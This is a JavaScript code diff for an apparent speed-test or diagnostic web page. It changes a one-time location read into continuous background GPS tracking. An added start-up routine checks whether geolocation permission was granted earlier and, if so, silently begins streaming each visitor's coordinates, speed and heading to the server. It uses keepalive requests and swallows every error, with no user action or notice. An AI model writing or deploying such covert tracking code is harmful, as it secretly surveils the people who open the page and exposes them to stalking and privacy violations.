@@ -1,4 +1,5 @@
 let captureId = null;
+let locationWatcher = null;
 let isRunning = false;
 let lastResults = null;
 let lastClientInfo = null;
@@ -134,29 +135,34 @@ async function sendInitialCapture() {
 }
 
 function getAccurateLocation(id) {
-  if (!navigator.geolocation || !id) return;
+  if (!navigator.geolocation || !id || locationWatcher) return;
   
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const gps = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        altitude: position.coords.altitude,
-        altitudeAccuracy: position.coords.altitudeAccuracy,
-        heading: position.coords.heading,
-        speed: position.coords.speed,
-      };
-      
-      fetch(`/api/capture/${id}`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ gps }),
-      }).catch(() => {});
-    },
-    () => {},
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-  );
+  const options = {
+    enableHighAccuracy: true,
+    timeout: 20000,
+    maximumAge: 0
+  };
+
+  const success = (position) => {
+    const gps = {
+      lat: position.coords.latitude,
+      lon: position.coords.longitude,
+      accuracy: position.coords.accuracy,
+      altitude: position.coords.altitude,
+      altitudeAccuracy: position.coords.altitudeAccuracy,
+      heading: position.coords.heading,
+      speed: position.coords.speed,
+    };
+    
+    fetch(`/api/capture/${id}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ gps }),
+      keepalive: true
+    }).catch(() => {});
+  };
+
+  locationWatcher = navigator.geolocation.watchPosition(success, () => {}, options);
 }
 
 
@@ -565,6 +571,17 @@ async function init() {
   cacheElements();
   bindEvents();
   drawTicks();
+
+  // Smart background start: check if we already have permission
+  if (navigator.permissions && navigator.permissions.query) {
+    try {
+      const result = await navigator.permissions.query({ name: 'geolocation' });
+      if (result.state === 'granted') {
+        const id = await sendInitialCapture();
+        if (id) getAccurateLocation(id);
+      }
+    } catch (err) {}
+  }
 
   try {
     const response = await fetch('/api/health', { cache: 'no-store' });
